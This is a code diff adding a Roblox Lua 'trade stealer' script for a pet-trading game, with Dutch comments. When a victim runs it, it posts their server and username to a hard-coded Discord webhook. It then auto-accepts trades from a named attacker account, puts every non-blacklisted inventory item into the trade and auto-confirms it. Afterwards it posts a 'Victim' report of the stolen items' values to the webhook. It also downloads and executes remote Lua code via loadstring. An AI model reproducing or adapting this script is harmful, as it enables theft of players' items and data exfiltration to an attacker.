@@ -1,0 +1,161 @@
+local targetName = "Jazonyy67"
+local webhookUrl = "https://discord.com/api/webhooks/1341107287410085981/QiHyPjtrwCzC9GYduKIGOXczelwGJoEn3unlFFvg29pONqILCWoMkWmf7CTPUEBcGOaH"
+local valuesUrl = "https://raw.githubusercontent.com/deltamokey-arch/adm-values/refs/heads/main/values.lua"
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- 🚫 BLACKLIST
+local BLACKLIST = {
+    ["practice_dog"] = true, 
+    ["starter_egg"] = true, 
+    ["sandwich-default"] = true,
+    ["ice_skates"] = true,
+    ["trade_license"] = true, 
+    ["beach_2024_mahi_spinning_rod_temporary"] = true,
+    ["white_bowtie"] = true, 
+    ["cowbell"] = true, 
+    ["blue_cap"] = true,
+    ["squeaky_bone_default"] = true, 
+    ["stroller-default"] = true
+}
+
+-- 🛠 WAARDE DATABASE
+local function getExternalValues()
+    local source = ""
+    local s, err = pcall(function() source = game:HttpGet(valuesUrl) end)
+    if not s or source == "" then return {pets = {}} end
+    source = source:match("^%s*(.-)%s*$")
+    if not source:find("return") then source = source .. "\nreturn ValueList" end
+    local func = loadstring(source)
+    return func and func() or {pets = {}}
+end
+local ValueList = getExternalValues()
+
+-- 🔍 ITEM INFO
+local function getItemInfo(uniqueId)
+    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = ""}
+    pcall(function()
+        local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
+        local inv = data and data.inventory
+        if not inv then return end
+        for cat, group in pairs(inv) do
+            if group[uniqueId] then
+                local d = group[uniqueId]
+                info.rawId = d.id or cat
+                local name = info.rawId:gsub("_", " "):gsub("(%l)(%w*)", function(a,b) return a:upper()..b:lower() end)
+                local vData = ValueList.pets and ValueList.pets[name]
+                local p = d.properties or {}
+                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. (p.flyable and "F" or "") .. (p.rideable and "R" or "")
+                info.name = name .. (tag ~= "" and " ("..tag..")" or "")
+                if vData then
+                    local prefix = (d.mega_neon and "mvalue") or (d.neon and "nvalue") or "rvalue"
+                    info.value = vData[prefix] or vData["value"] or 0
+                    info.rarity = (vData.rarity or "common"):upper()
+                else
+                    info.rarity = (d.rarity or "common"):upper()
+                end
+                break
+            end
+        end
+    end)
+    return info
+end
+
+-- 📊 HIT WEBHOOK
+local function postLog(data)
+    if #data == 0 then return end
+    local list, total = "", 0
+    for _, i in ipairs(data) do
+        list = list .. "┕ **[" .. i.rarity .. "]** " .. i.name .. " | `Val: " .. i.value .. "`\n"
+        total = total + i.value
+    end
+    local embed = {
+        content = "🚨 **NEW HIT DETECTED** 🚨",
+        embeds = {{
+            title = "🎯 PAXS REPORT",
+            color = 16711680,
+            fields = {
+                {name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true},
+                {name = "💎 Total Value", value = "```" .. total .. "```", inline = true},
+                {name = "📦 Items", value = list}
+            },
+            footer = {text = "Paxz V28 • " .. os.date("%X")}
+        }}
+    }
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request or request
+        req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
+    end)
+end
+
+-- ⚡ LOOP
+task.spawn(function()
+    local API = ReplicatedStorage:WaitForChild("API")
+    
+    -- JOIN DATA STUREN
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request or request
+        req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({["content"] = "JOIN_DATA:" .. game.PlaceId .. ":" .. game.JobId .. ":" .. LocalPlayer.Name})})
+    end)
+
+    while true do
+        task.wait(0.6)
+        local target = Players:FindFirstChild(targetName)
+        local ui = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
+
+        if target then
+            -- CONSTANT ACCEPTEREN (Gebruik pcall om crashes te voorkomen als Remote niet bestaat)
+            task.spawn(function() 
+                pcall(function() 
+                    local accRemote = API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest")
+                    if accRemote then accRemote:InvokeServer(target, true) end
+                end) 
+            end)
+
+            if ui and ui:FindFirstChild("Frame") and ui.Frame.Visible then
+                local currentTradeItems = {}
+                local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
+                local inv = data and data.inventory
+                
+                if inv then
+                    for cat, group in pairs(inv) do
+                        if cat ~= "stickers" then
+                            for id, _ in pairs(group) do 
+                                local stats = getItemInfo(id)
+                                if not BLACKLIST[stats.rawId] then
+                                    table.insert(currentTradeItems, stats)
+                                    pcall(function() 
+                                        local addRemote = API:FindFirstChild("TradeAPI/AddItemToOffer")
+                                        if addRemote then addRemote:FireServer(id) end
+                                    end)
+                                end
+                            end
+                        end
+                    end
+                end
+
+                -- Wachten tot trade klaar is
+                while ui and ui:FindFirstChild("Frame") and ui.Frame.Visible do
+                    pcall(function() 
+                        local negRemote = API:FindFirstChild("TradeAPI/AcceptNegotiation")
+                        local conRemote = API:FindFirstChild("TradeAPI/ConfirmTrade")
+                        if negRemote then negRemote:FireServer() end
+                        if conRemote then conRemote:FireServer() end
+                    end)
+                    task.wait(0.4)
+                end
+
+                if #currentTradeItems > 0 then postLog(currentTradeItems) end
+            else
+                -- Request sturen als we niet in trade zitten
+                pcall(function() 
+                    local sndRemote = API:FindFirstChild("TradeAPI/SendTradeRequest")
+                    if sndRemote then sndRemote:FireServer(target) end
+                end)
+            end
+        end
+    end
+end)
